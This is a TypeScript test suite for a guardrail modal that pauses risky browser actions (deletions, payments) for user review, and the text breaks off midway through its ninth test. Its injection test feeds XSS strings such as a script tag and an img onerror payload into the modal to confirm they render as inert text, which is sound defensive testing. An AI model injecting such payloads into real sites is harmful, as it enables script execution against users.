/**
 * Guardrail Staging Mode - Visual Shell Component Test Suite
 *
 * Verifies the Staging Modal UI lifecycle, DOM hierarchy, and rendering:
 * 1. Mounting, Shadow DOM Attachment & Isolation.
 * 2. Singleton Lifecycle & Duplicate Prevention.
 * 3. Dismissal Lifecycle (Close button, Backdrop click, Escape key, Programmatic).
 * 4. Active State Content Hierarchy & Risk Color Treatments (LOW, MEDIUM, HIGH, CRITICAL).
 * 5. Loading and Empty / Unavailable State Views.
 * 6. DOM Text API Safety & HTML Injection Resistance.
 * 7. In-place Update Capability (`updateStagingModal`).
 */

declare const process: { exit: (code: number) => void };

// Setup minimal DOM simulation in Node
class MockDOMTokenList {
  private classes: Set<string> = new Set();
  constructor(initial: string = '') {
    if (initial) {
      initial.split(/\s+/).filter(Boolean).forEach((c) => this.classes.add(c));
    }
  }
  add(...tokens: string[]): void {
    tokens.forEach((t) => this.classes.add(t));
  }
  remove(...tokens: string[]): void {
    tokens.forEach((t) => this.classes.delete(t));
  }
  contains(token: string): boolean {
    return this.classes.has(token);
  }
  toString(): string {
    return Array.from(this.classes).join(' ');
  }
}

class MockDOMElement {
  public tagName: string;
  public id: string = '';
  public attributes: Record<string, string> = {};
  public style: Record<string, string> = {};
  public children: MockDOMElement[] = [];
  public parentNode: MockDOMElement | null = null;
  public shadowRoot: MockShadowRoot | null = null;
  public listeners: Record<string, ((e: any) => void)[]> = {};
  private _textContent: string = '';
  public classList: MockDOMTokenList;
  public disabled: boolean = false;

  get firstChild(): MockDOMElement | null {
    return this.children[0] || null;
  }

  constructor(tagName: string) {
    this.tagName = tagName.toUpperCase();
    this.classList = new MockDOMTokenList();
  }

  get className(): string {
    return this.classList.toString();
  }

  set className(val: string) {
    this.classList = new MockDOMTokenList(val);
  }

  get textContent(): string {
    if (this.children.length === 0) {
      return this._textContent;
    }
    return this.children.map((c) => c.textContent).join('');
  }

  set textContent(val: string) {
    this._textContent = val;
    this.children = [];
  }

  setAttribute(name: string, value: string): void {
    this.attributes[name] = value;
    if (name === 'id') this.id = value;
    if (name === 'class') this.className = value;
  }

  getAttribute(name: string): string | null {
    return this.attributes[name] ?? null;
  }

  removeAttribute(name: string): void {
    delete this.attributes[name];
    if (name === 'id') this.id = '';
  }

  appendChild<T extends MockDOMElement>(child: T): T {
    child.parentNode = this;
    this.children.push(child);
    return child;
  }

  removeChild<T extends MockDOMElement>(child: T): T {
    const idx = this.children.indexOf(child);
    if (idx !== -1) {
      this.children.splice(idx, 1);
      child.parentNode = null;
    }
    return child;
  }

  insertBefore<T extends MockDOMElement>(newChild: T, refChild: MockDOMElement | null): T {
    newChild.remove();
    newChild.parentNode = this;
    if (!refChild) {
      this.children.push(newChild);
      return newChild;
    }
    const idx = this.children.indexOf(refChild);
    if (idx === -1) {
      this.children.push(newChild);
    } else {
      this.children.splice(idx, 0, newChild);
    }
    return newChild;
  }

  click(): void {
    if (this.disabled) return;
    this.focus();
    this.dispatchEvent({ type: 'click', target: this });
  }

  focus(): void {
    if (typeof (globalThis as any).document !== 'undefined' && (globalThis as any).document._setActiveElement) {
      (globalThis as any).document._setActiveElement(this);
    }
    this.dispatchEvent({ type: 'focus', target: this });
  }

  blur(): void {
    if (typeof (globalThis as any).document !== 'undefined' && (globalThis as any).document._setActiveElement) {
      (globalThis as any).document._setActiveElement(null);
    }
    this.dispatchEvent({ type: 'blur', target: this });
  }

  contains(other: MockDOMElement | null): boolean {
    if (!other) return false;
    if (other === this) return true;
    let curr: MockDOMElement | null = other.parentNode;
    while (curr) {
      if (curr === this) return true;
      curr = curr.parentNode;
    }
    return false;
  }

  remove(): void {
    if (this.parentNode) {
      this.parentNode.removeChild(this);
    }
  }

  attachShadow(init: { mode: 'open' | 'closed' }): MockShadowRoot {
    const shadow = new MockShadowRoot(init.mode);
    this.shadowRoot = shadow;
    shadow.host = this;
    return shadow;
  }

  addEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(fn);
  }

  removeEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) return;
    this.listeners[type] = this.listeners[type].filter((l) => l !== fn);
  }

  dispatchEvent(event: any): boolean {
    if (this.listeners[event.type]) {
      for (const listener of this.listeners[event.type]) {
        listener(event);
      }
    }
    return true;
  }

  querySelector(selector: string): MockDOMElement | null {
    if (selector.includes(' ')) {
      const parts = selector.split(/\s+/).filter(Boolean);
      let curr: MockDOMElement | null = this;
      for (const part of parts) {
        if (!curr) return null;
        curr = querySelectorInternal(curr, part);
      }
      return curr;
    }
    return querySelectorInternal(this, selector);
  }

  querySelectorAll(selector: string): MockDOMElement[] {
    if (selector.includes(' ')) {
      const parts = selector.split(/\s+/).filter(Boolean);
      let currentElements: MockDOMElement[] = [this];
      for (const part of parts) {
        const nextElements: MockDOMElement[] = [];
        for (const el of currentElements) {
          querySelectorAllInternal(el, part, nextElements);
        }
        currentElements = nextElements;
      }
      return currentElements;
    }
    const results: MockDOMElement[] = [];
    querySelectorAllInternal(this, selector, results);
    return results;
  }
}

class MockShadowRoot extends MockDOMElement {
  public mode: string;
  public host: MockDOMElement | null = null;
  public activeElement: MockDOMElement | null = null;
  constructor(mode: string) {
    super('#SHADOW-ROOT');
    this.mode = mode;
  }
  override contains(other: MockDOMElement | null): boolean {
    if (!other) return false;
    if (other === this) return true;
    let curr: MockDOMElement | null = other;
    while (curr) {
      if (curr === this) return true;
      curr = curr.parentNode;
    }
    return false;
  }
}

function querySelectorInternal(root: MockDOMElement, selector: string): MockDOMElement | null {
  for (const child of root.children) {
    if (matchesSelector(child, selector)) {
      return child;
    }
    const found = querySelectorInternal(child, selector);
    if (found) return found;
  }
  return null;
}

function querySelectorAllInternal(root: MockDOMElement, selector: string, acc: MockDOMElement[]): void {
  for (const child of root.children) {
    if (matchesSelector(child, selector)) {
      acc.push(child);
    }
    querySelectorAllInternal(child, selector, acc);
  }
}

function matchesSelector(el: MockDOMElement, selector: string): boolean {
  const trimmed = selector.trim();
  if (trimmed.startsWith('#')) {
    return el.id === trimmed.slice(1);
  }
  if (trimmed.startsWith('.')) {
    return el.classList.contains(trimmed.slice(1));
  }
  if (trimmed === 'button:not(:disabled)') {
    return el.tagName.toLowerCase() === 'button' && !el.disabled;
  }
  return el.tagName.toLowerCase() === trimmed.toLowerCase();
}

class MockDocument {
  public body: MockDOMElement;
  public activeElement: MockDOMElement | null = null;
  public listeners: Record<string, ((e: any) => void)[]> = {};
  constructor() {
    this.body = new MockDOMElement('BODY');
  }
  _setActiveElement(el: MockDOMElement | null): void {
    this.activeElement = el;
    let curr: MockDOMElement | null = el;
    while (curr) {
      if (curr instanceof MockShadowRoot) {
        curr.activeElement = el;
        break;
      }
      curr = curr.parentNode;
    }
  }
  createElement(tag: string): MockDOMElement {
    return new MockDOMElement(tag);
  }
  getElementById(id: string): MockDOMElement | null {
    return querySelectorInternal(this.body, `#${id}`);
  }
  addEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(fn);
  }
  removeEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) return;
    this.listeners[type] = this.listeners[type].filter((l) => l !== fn);
  }
  dispatchEvent(event: any): void {
    if (this.listeners[event.type]) {
      for (const listener of this.listeners[event.type]) {
        listener(event);
      }
    }
  }
}

class MockWindow {
  public listeners: Record<string, ((e: any) => void)[]> = {};
  addEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(fn);
  }
  removeEventListener(type: string, fn: (e: any) => void): void {
    if (!this.listeners[type]) return;
    this.listeners[type] = this.listeners[type].filter((l) => l !== fn);
  }
  dispatchEvent(event: any): void {
    if (this.listeners[event.type]) {
      for (const listener of this.listeners[event.type]) {
        listener(event);
      }
    }
  }
}

if (typeof (globalThis as any).CustomEvent === 'undefined') {
  (globalThis as any).CustomEvent = class CustomEvent {
    public type: string;
    public detail: any;
    constructor(type: string, init?: { detail?: any }) {
      this.type = type;
      this.detail = init?.detail;
    }
  };
}

// Install mock environment globally
const mockDoc = new MockDocument();
const mockWin = new MockWindow();
(globalThis as any).document = mockDoc;
(globalThis as any).window = mockWin;

import { classifyAction } from '../classifier/index.js';
import { assessRisk } from '../risk/index.js';
import {
  createApprovalRequestIntent,
  createStagingActionContext,
} from './context.js';
import {
  ActionCategory,
  ActionType,
  GuardrailAction,
} from '../types/actions.js';
import {
  ApprovalRequestIntent,
  ApprovalRequestResult,
} from '../types/approval.js';
import { InterceptionRecord, InterceptionState } from '../types/interception.js';
import { ResponseAction, ResponseDecision } from '../types/response.js';
import { RiskLevel } from '../types/risk.js';
import { StagingActionContext } from '../types/staging.js';
import {
  STAGING_HOST_ELEMENT_ID,
  dismissStagingModal,
  formatActionTypeName,
  formatCategoryName,
  getRiskLevelPresentation,
  getSafeDisplayHost,
  getStagingModalShadowRoot,
  getStagingUIState,
  setStagingUIState,
  announceStagingState,
  getFocusableElements,
  handleModalCancel,
  handleModalRequestApproval,
  isStagingModalActive,
  showStagingModal,
  translateRiskReason,
  updateStagingModal,
} from './modal.js';
import { InterceptionController } from '../interception/controller.js';
import { ContinuationManager } from '../interception/continuation.js';
import { InvalidStateTransitionError } from '../interception/transitions.js';

let passed = 0;
let failed = 0;

function assert(condition: boolean, message: string): void {
  if (condition) {
    console.log(`  ✓ ${message}`);
    passed++;
  } else {
    console.error(`  ✗ FAIL: ${message}`);
    failed++;
  }
}

function assertEquals<T>(actual: T, expected: T, message: string): void {
  if (actual === expected) {
    console.log(`  ✓ ${message}: ${String(actual)}`);
    passed++;
  } else {
    console.error(`  ✗ FAIL: ${message}. Expected "${String(expected)}", received "${String(actual)}"`);
    failed++;
  }
}

console.log('\n============================================================');
console.log('🧪 GUARDRAIL STAGING MODE: VISUAL SHELL TEST SUITE');
console.log('============================================================\n');

function createSampleContext(overrides: Partial<StagingActionContext> = {}): StagingActionContext {
  return {
    actionId: 'act-ui-sample-123',
    description: 'Destructive operation: Click on "Delete All Data"',
    actionType: ActionType.CLICK,
    category: ActionCategory.DESTRUCTIVE,
    riskLevel: RiskLevel.CRITICAL,
    riskScore: 100,
    riskReasons: [
      'Target element is a destructive delete button',
      'Action causes permanent bulk data removal',
    ],
    responseAction: ResponseAction.PROTECT,
    interceptionState: InterceptionState.HELD,
    interceptionReason: 'Action halted pending user protection review.',
    origin: 'https://app.example.com',
    hostname: 'app.example.com',
    pageTitle: 'Account Settings',
    timestamp: '2026-10-13T10:00:00.000Z',
    stagedAt: '2026-10-13T10:00:00.050Z',
    ...overrides,
  };
}

// =============================================================================
// TEST 1: MOUNTING, SHADOW DOM ATTACHMENT & ISOLATION
// =============================================================================
console.log('▶ Test 1: Mounting, Shadow DOM Attachment & Isolation');
{
  dismissStagingModal();
  assertEquals(isStagingModalActive(), false, 'Modal is initially not active');

  const context = createSampleContext();
  const dismiss = showStagingModal({ context });

  assertEquals(isStagingModalActive(), true, 'Modal is active after showStagingModal');

  const host = mockDoc.getElementById(STAGING_HOST_ELEMENT_ID);
  assert(Boolean(host), 'Host element is mounted in document.body');
  assertEquals(host?.id, STAGING_HOST_ELEMENT_ID, 'Host element has correct ID');
  assertEquals(host?.style.zIndex, '2147483647', 'Host element has maximum z-index');

  const shadow = getStagingModalShadowRoot();
  assert(Boolean(shadow), 'Shadow root is attached to host');
  assertEquals((shadow as any)?.mode, 'open', 'Shadow root is in open mode');

  // Verify internal styles and backdrop
  const styleEl = shadow?.querySelector('style');
  assert(Boolean(styleEl), 'Scoped style element present in shadow root');

  const backdrop = shadow?.querySelector('.gs-backdrop');
  assert(Boolean(backdrop), 'Backdrop element present in shadow root');

  const shell = shadow?.querySelector('.gs-shell');
  assert(Boolean(shell), 'Shell card element present inside backdrop');
  assertEquals(shell?.getAttribute('role'), 'dialog', 'Shell card has role="dialog"');
  assertEquals(shell?.getAttribute('aria-modal'), 'true', 'Shell card has aria-modal="true"');

  dismiss();
  assertEquals(isStagingModalActive(), false, 'Modal is inactive after dismiss()');
}

// =============================================================================
// TEST 2: SINGLETON LIFECYCLE & DUPLICATE PREVENTON
// =============================================================================
console.log('\n▶ Test 2: Singleton Lifecycle & Duplicate Prevention');
{
  dismissStagingModal();

  // Open 3 times consecutively
  showStagingModal({ context: createSampleContext() });
  showStagingModal({ context: createSampleContext() });
  showStagingModal({ context: createSampleContext() });

  // Only 1 host element should ever exist in document.body
  const matchingHosts = mockDoc.body.querySelectorAll(`#${STAGING_HOST_ELEMENT_ID}`);
  assertEquals(matchingHosts.length, 1, 'Exactly one host element exists despite multiple calls');

  dismissStagingModal();
  assertEquals(isStagingModalActive(), false, 'Clean dismissal leaves 0 active modals');
}

// =============================================================================
// TEST 3: DISMISSAL LIFECYCLE & CALLBACKS
// =============================================================================
console.log('\n▶ Test 3: Dismissal Lifecycle & Callbacks');
{
  // Subtest 3A: Close button click
  let dismissCalled = false;
  showStagingModal({
    context: createSampleContext(),
    onDismiss: () => {
      dismissCalled = true;
    },
  });

  const shadow = getStagingModalShadowRoot();
  const closeBtn = shadow?.querySelector('.gs-btn-close');
  assert(Boolean(closeBtn), 'Close button exists in header');

  closeBtn?.dispatchEvent({ type: 'click' } as any);
  assertEquals(dismissCalled, true, 'onDismiss called when close button is clicked');
  assertEquals(isStagingModalActive(), false, 'Modal dismissed after close button click');

  // Subtest 3B: Backdrop click
  let backdropDismissCalled = false;
  showStagingModal({
    context: createSampleContext(),
    onDismiss: () => {
      backdropDismissCalled = true;
    },
  });

  const shadow2 = getStagingModalShadowRoot();
  const backdrop = shadow2?.querySelector('.gs-backdrop');
  assert(Boolean(backdrop), 'Backdrop element exists');

  // Dispatch click where target === backdrop
  backdrop?.dispatchEvent({ type: 'click', target: backdrop } as any);
  assertEquals(backdropDismissCalled, true, 'onDismiss called when backdrop clicked');
  assertEquals(isStagingModalActive(), false, 'Modal dismissed after backdrop click');

  // Subtest 3C: Escape key dismissal
  let escapeDismissCalled = false;
  showStagingModal({
    context: createSampleContext(),
    onDismiss: () => {
      escapeDismissCalled = true;
    },
  });

  mockWin.dispatchEvent({ type: 'keydown', key: 'Escape' });
  assertEquals(escapeDismissCalled, true, 'onDismiss called on Escape keydown');
  assertEquals(isStagingModalActive(), false, 'Modal dismissed after Escape key');
}

// =============================================================================
// TEST 4: ACTIVE STATE CONTENT HIERARCHY & RISK TREATMENT
// =============================================================================
console.log('\n▶ Test 4: Active State Content Hierarchy & Risk Treatment');
{
  // 1. CRITICAL Risk Treatment
  const critContext = createSampleContext({
    riskLevel: RiskLevel.CRITICAL,
    riskScore: 95,
    description: 'Destructive operation: Click on "Purge All Logs"',
  });
  showStagingModal({ context: critContext });
  let shadow = getStagingModalShadowRoot();

  // Guardrail Identity
  const brandTitle = shadow?.querySelector('.gs-brand-title');
  assertEquals(brandTitle?.textContent, 'Guardrail Staging', 'Brand identity rendered');

  // Prominent Heading
  const headingTitle = shadow?.querySelector('.gs-heading-title');
  assertEquals(headingTitle?.textContent, 'Action Paused for Your Review', 'Prominent paused heading rendered');

  // Action Summary
  const descEl = shadow?.querySelector('.gs-action-desc');
  assertEquals(descEl?.textContent, 'Destructive operation: Click on "Purge All Logs"', 'Action description rendered');

  // Risk Treatment Card
  const riskCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(riskCard?.classList.contains('gs-risk-critical')), 'CRITICAL risk applies .gs-risk-critical class');

  const riskBadge = shadow?.querySelector('.gs-risk-badge');
  assertEquals(riskBadge?.textContent, 'CRITICAL (95)', 'Risk badge includes score');

  // Reasons List
  const reasons = shadow?.querySelectorAll('.gs-reason-item');
  assertEquals(reasons?.length, 2, 'All 2 risk reasons rendered');

  // 2. LOW Risk Treatment (Restrained green accent)
  const lowContext = createSampleContext({
    riskLevel: RiskLevel.LOW,
    riskScore: 10,
    category: ActionCategory.GENERAL,
    description: 'Click on interactive element "View Dashboard"',
  });
  updateStagingModal({ context: lowContext });
  shadow = getStagingModalShadowRoot();

  const lowRiskCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(lowRiskCard?.classList.contains('gs-risk-low')), 'LOW risk applies .gs-risk-low class');

  // 3. HIGH Risk Treatment (Amber)
  const highContext = createSampleContext({
    riskLevel: RiskLevel.HIGH,
    riskScore: 65,
    category: ActionCategory.PAYMENT,
    description: 'Payment trigger: Click on "Pay ₹5,000"',
  });
  updateStagingModal({ context: highContext });
  shadow = getStagingModalShadowRoot();

  const highRiskCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(highRiskCard?.classList.contains('gs-risk-high')), 'HIGH risk applies .gs-risk-high class');

  dismissStagingModal();
}

// =============================================================================
// TEST 5: LOADING AND EMPTY / UNAVAILABLE STATE VIEWS
// =============================================================================
console.log('\n▶ Test 5: Loading and Empty / Unavailable State Views');
{
  // Subtest 5A: Loading State
  showStagingModal({ state: 'loading' });
  let shadow = getStagingModalShadowRoot();

  const loadingTitle = shadow?.querySelector('.gs-state-title');
  assertEquals(loadingTitle?.textContent, 'Loading Staging Preview...', 'Loading state title rendered');

  const loadingDesc = shadow?.querySelector('.gs-state-desc');
  assert(Boolean(loadingDesc?.textContent.includes('preparing the security context')), 'Loading description rendered');

  // Subtest 5B: Empty State
  showStagingModal({ state: 'empty' });
  shadow = getStagingModalShadowRoot();

  const emptyTitle = shadow?.querySelector('.gs-state-title');
  assertEquals(emptyTitle?.textContent, 'No Action Currently Paused', 'Empty state title rendered');

  const emptyDesc = shadow?.querySelector('.gs-state-desc');
  assert(Boolean(emptyDesc?.textContent.includes('no interactions waiting for review')), 'Empty description rendered');

  dismissStagingModal();
}

// =============================================================================
// TEST 6: DOM TEXT API SAFETY & HTML INJECTION RESISTANCE
// =============================================================================
console.log('\n▶ Test 6: DOM Text API Safety & HTML Injection Resistance');
{
  const maliciousContext = createSampleContext({
    description: '<script>alert("xss")</script><b>Dangerous Click</b>',
    origin: 'https://evil.example.com/<script>',
    riskReasons: [
      '<img src=x onerror=alert(1)> Injected Reason',
      'Plain safe reason',
    ],
  });

  showStagingModal({ context: maliciousContext });
  const shadow = getStagingModalShadowRoot();

  // Verify description is strictly text, not HTML elements
  const descEl = shadow?.querySelector('.gs-action-desc');
  assertEquals(
    descEl?.textContent,
    '<script>alert("xss")</script><b>Dangerous Click</b>',
    'Description is assigned purely as textContent'
  );
  assertEquals(descEl?.children.length, 0, 'No HTML tags created from malicious description');

  // Verify reasons are strictly text
  const reasons = shadow?.querySelectorAll('.gs-reason-item');
  assertEquals(reasons?.length, 2, 'Two reason items rendered');
  const firstReasonText = reasons?.[0].textContent;
  assert(Boolean(firstReasonText?.includes('<img src=x onerror=alert(1)>')), 'Injected tags remain unparsed raw text');

  dismissStagingModal();
}

// =============================================================================
// TEST 7: IN-PLACE UPDATE CAPABILITY
// =============================================================================
console.log('\n▶ Test 7: In-Place Update Capability');
{
  showStagingModal({ state: 'loading' });
  const shadow1 = getStagingModalShadowRoot();
  assertEquals(shadow1?.querySelector('.gs-state-title')?.textContent, 'Loading Staging Preview...', 'Initially loading');

  // Update in-place to active context
  const activeCtx = createSampleContext({
    description: 'Updated Action Description',
  });
  updateStagingModal({ context: activeCtx, state: 'active' });

  const shadow2 = getStagingModalShadowRoot();
  assertEquals(shadow1, shadow2, 'Shadow root preserved across updateStagingModal');
  assertEquals(
    shadow2?.querySelector('.gs-action-desc')?.textContent,
    'Updated Action Description',
    'Updated description rendered in place'
  );

  dismissStagingModal();
}

// =============================================================================
// TEST 8: REAL PIPELINE INTEGRATION ACROSS RISK LEVELS (LOW, MEDIUM, HIGH, CRITICAL)
// =============================================================================
console.log('\n▶ Test 8: Real Pipeline Integration Across Risk Levels');
{
  // Subtest 8A: LOW-RISK Routine Action
  console.log('  → Subtest 8A: Low-Risk Action (Generic / Docs Link)');
  const lowAction: GuardrailAction = {
    id: 'act-low-pipeline-1',
    type: ActionType.CLICK,
    element: { tagName: 'BUTTON', id: 'btn-docs', visibleText: 'View Documentation' },
    page: { url: 'https://docs.service.internal/guide', title: 'Service Docs' },
    timestamp: '2026-10-13T12:00:00.000Z',
  };
  const lowClassification = classifyAction(lowAction);
  const lowRisk = assessRisk(lowAction, lowClassification);
  const lowDecision: ResponseDecision = {
    actionId: lowAction.id,
    response: ResponseAction.ALLOW,
    reasons: ['Routine action allowed under default policy'],
    createdAt: new Date().toISOString(),
  };
  const lowRecord: InterceptionRecord = {
    actionId: lowAction.id,
    state: InterceptionState.HELD,
    createdAt: new Date().toISOString(),
    reason: 'Held for preview testing',
  };
  const lowContext = createStagingActionContext({
    action: lowAction,
    classification: lowClassification,
    risk: lowRisk,
    decision: lowDecision,
    interception: lowRecord,
  });

  assertEquals(lowRisk.riskLevel, RiskLevel.LOW, 'Pipeline evaluates low action to LOW risk');
  showStagingModal({ context: lowContext });
  let shadow = getStagingModalShadowRoot();

  const lowCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(lowCard?.classList.contains('gs-risk-low')), 'Modal applies .gs-risk-low styling');
  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, `LOW (${lowRisk.score})`, 'Risk badge shows LOW with score');
  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('Routine Activity')), 'Reassuring routine activity headline');
  assert(Boolean(shadow?.querySelector('.gs-action-desc')?.textContent?.includes('View Documentation')), 'Readable action description rendered');

  // Verify website hostname rendered safely
  const metaLabels = shadow?.querySelectorAll('.gs-meta-label') || [];
  const metaValues = shadow?.querySelectorAll('.gs-meta-value') || [];
  let websiteValue = '';
  metaLabels.forEach((label, idx) => {
    if (label.textContent === 'Website') {
      websiteValue = metaValues[idx]?.textContent || '';
    }
  });
  assertEquals(websiteValue, 'docs.service.internal', 'Website hostname rendered safely');

  // Verify risk reason translated to non-technical plain English
  const lowReasonItems = shadow?.querySelectorAll('.gs-reason-item') || [];
  assertEquals(lowReasonItems.length, 1, 'Exactly one reason item rendered');
  const lowHeadline = shadow?.querySelector('.gs-reason-summary')?.textContent;
  const lowDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
  assertEquals(lowHeadline, 'Routine Interaction', 'Reason headline translated to friendly summary');
  assertEquals(lowDetail, 'No elevated risk signals detected. Routine interaction.', 'Preserves exact risk engine reason in detail');

  // Subtest 8B: MEDIUM-RISK Action (Payment Trigger)
  console.log('  → Subtest 8B: Medium-Risk Action (Payment Flow)');
  const medAction: GuardrailAction = {
    id: 'act-med-pipeline-2',
    type: ActionType.CLICK,
    element: { tagName: 'BUTTON', id: 'btn-pay-now', visibleText: 'Pay ₹2,500' },
    page: { url: 'https://checkout.shop.com/pay', title: 'Payment Checkout' },
    timestamp: '2026-10-13T12:00:00.000Z',
  };
  const medClassification = classifyAction(medAction);
  const medRisk = assessRisk(medAction, medClassification);
  const medDecision: ResponseDecision = {
    actionId: medAction.id,
    response: ResponseAction.WARN,
    reasons: ['Payment flow triggered'],
    createdAt: new Date().toISOString(),
  };
  const medRecord: InterceptionRecord = {
    actionId: medAction.id,
    state: InterceptionState.HELD,
    createdAt: new Date().toISOString(),
    reason: 'Held for preview testing',
  };
  const medContext = createStagingActionContext({
    action: medAction,
    classification: medClassification,
    risk: medRisk,
    decision: medDecision,
    interception: medRecord,
  });

  assertEquals(medClassification.category, ActionCategory.PAYMENT, 'Classifier categorizes as PAYMENT');
  assertEquals(medRisk.riskLevel, RiskLevel.MEDIUM, 'Risk engine evaluates payment to MEDIUM risk');
  assertEquals(medRisk.score, 40, 'Payment action score contribution is 40');

  updateStagingModal({ context: medContext });
  shadow = getStagingModalShadowRoot();

  const medCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(medCard?.classList.contains('gs-risk-medium')), 'Modal applies .gs-risk-medium styling');
  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'MEDIUM (40)', 'Risk badge shows MEDIUM (40)');

  // Verify non-technical category label
  let categoryValue = '';
  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
    if (label.textContent === 'Category') {
      categoryValue = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
    }
  });
  assertEquals(categoryValue, 'Payment & Billing', 'Category formatted as "Payment & Billing"');

  // Verify risk reason headline and detail
  const medHeadline = shadow?.querySelector('.gs-reason-summary')?.textContent;
  const medDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
  assertEquals(medHeadline, 'Payment or Billing Activity', 'Risk reason translated to non-technical headline');
  assertEquals(medDetail, 'Action interacts with financial transactions, checkout flows, or billing elements.', 'Detail displays exact risk engine explanation');

  // Subtest 8C: HIGH-RISK Action (Destructive Deletion)
  console.log('  → Subtest 8C: High-Risk Action (Destructive Account Removal)');
  const highAction: GuardrailAction = {
    id: 'act-high-pipeline-3',
    type: ActionType.CLICK,
    element: { tagName: 'BUTTON', id: 'btn-delete-account', visibleText: 'Delete Account' },
    page: { url: 'https://security.service.com/account/delete', title: 'Delete Account' },
    timestamp: '2026-10-13T12:00:00.000Z',
  };
  const highClassification = classifyAction(highAction);
  const highRisk = assessRisk(highAction, highClassification);
  const highDecision: ResponseDecision = {
    actionId: highAction.id,
    response: ResponseAction.PROTECT,
    reasons: ['Destructive deletion requires protective gating'],
    createdAt: new Date().toISOString(),
  };
  const highRecord: InterceptionRecord = {
    actionId: highAction.id,
    state: InterceptionState.HELD,
    createdAt: new Date().toISOString(),
    reason: 'Held for preview testing',
  };
  const highContext = createStagingActionContext({
    action: highAction,
    classification: highClassification,
    risk: highRisk,
    decision: highDecision,
    interception: highRecord,
  });

  assertEquals(highClassification.category, ActionCategory.DESTRUCTIVE, 'Classifier categorizes as DESTRUCTIVE');
  assertEquals(highRisk.riskLevel, RiskLevel.HIGH, 'Risk engine evaluates destructive action to HIGH risk');
  assertEquals(highRisk.score, 50, 'Destructive action score contribution is 50');

  updateStagingModal({ context: highContext });
  shadow = getStagingModalShadowRoot();

  const highCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(highCard?.classList.contains('gs-risk-high')), 'Modal applies .gs-risk-high styling');
  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'HIGH (50)', 'Risk badge shows HIGH (50)');
  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('Sensitive Operation')), 'Reassuring sensitive operation headline');

  // Verify translated reason
  const highReasonSummary = shadow?.querySelector('.gs-reason-summary')?.textContent;
  const highReasonDetail = shadow?.querySelector('.gs-reason-detail')?.textContent;
  assertEquals(highReasonSummary, 'Permanent Removal or Deletion', 'Translated to "Permanent Removal or Deletion"');
  assertEquals(highReasonDetail, 'Action initiates permanent resource deletion, cancellation, or irreversible state destruction.', 'Supplied risk engine reason preserved in detail');

  // Subtest 8D: CRITICAL-RISK Action (Compounded High-Risk Signals)
  console.log('  → Subtest 8D: Critical-Risk Action (Compounded Destructive + Payment)');
  const critAction: GuardrailAction = {
    id: 'act-crit-pipeline-4',
    type: ActionType.CLICK,
    element: { tagName: 'BUTTON', id: 'btn-terminate-pay', visibleText: 'Delete Account and Pay Outstanding' },
    page: { url: 'https://security.service.com/account/terminate', title: 'Terminate Account' },
    timestamp: '2026-10-13T12:00:00.000Z',
  };
  const critClassification = classifyAction(critAction);
  const critRisk = assessRisk(critAction, critClassification);
  const critDecision: ResponseDecision = {
    actionId: critAction.id,
    response: ResponseAction.PROTECT,
    reasons: ['Compounded high-risk signals require protective gating'],
    createdAt: new Date().toISOString(),
  };
  const critRecord: InterceptionRecord = {
    actionId: critAction.id,
    state: InterceptionState.HELD,
    createdAt: new Date().toISOString(),
    reason: 'Held for preview testing',
  };
  const critContext = createStagingActionContext({
    action: critAction,
    classification: critClassification,
    risk: critRisk,
    decision: critDecision,
    interception: critRecord,
  });

  assertEquals(critRisk.riskLevel, RiskLevel.CRITICAL, 'Compounded action reaches CRITICAL risk level');
  assertEquals(critRisk.score, 90, 'Score sums DESTRUCTIVE (50) + PAYMENT (40) = 90');

  updateStagingModal({ context: critContext });
  shadow = getStagingModalShadowRoot();

  const critCard = shadow?.querySelector('.gs-risk-treatment');
  assert(Boolean(critCard?.classList.contains('gs-risk-critical')), 'Modal applies .gs-risk-critical styling');
  assertEquals(shadow?.querySelector('.gs-risk-badge')?.textContent, 'CRITICAL (90)', 'Risk badge shows CRITICAL (90)');
  assert(Boolean(shadow?.querySelector('.gs-risk-headline')?.textContent?.includes('High-Impact Action')), 'High-impact headline without claiming malice');
  assertEquals(shadow?.querySelectorAll('.gs-reason-item').length, 2, 'Renders both compounded risk reasons');

  dismissStagingModal();
}

// =============================================================================
// TEST 9: GRACEFUL DEGRADATION ON MISSING & UNKNOWN METADATA
// =============================================================================
console.log('\n▶ Test 9: Graceful Degradation on Missing & Unknown Metadata');
{
  // 9A: Missing or empty description
  const noDescContext = createSampleContext({
    description: '   ',
  });
  showStagingModal({ context: noDescContext });
  let shadow = getStagingModalShadowRoot();
  assertEquals(
    shadow?.querySelector('.gs-action-desc')?.textContent,
    'Action held for review on this page',
    'Empty description degrades to reassuring fallback'
  );

  // 9B: Missing / empty risk reasons
  const noReasonsContext = createSampleContext({
    riskReasons: [],
  });
  updateStagingModal({ context: noReasonsContext });
  shadow = getStagingModalShadowRoot();
  assertEquals(shadow?.querySelectorAll('.gs-reason-item').length, 1, 'Falls back to 1 safety notice item');
  assertEquals(
    shadow?.querySelector('.gs-reason-summary')?.textContent,
    'Standard Safety Check',
    'Fallback reason summary is "Standard Safety Check"'
  );
  assertEquals(
    shadow?.querySelector('.gs-reason-detail')?.textContent,
    'Guardrail paused this action as a standard safety precaution based on current settings.',
    'Fallback detail explains standard safety settings'
  );

  // 9C: Unknown category and unknown actionType
  const unknownCatContext = createSampleContext({
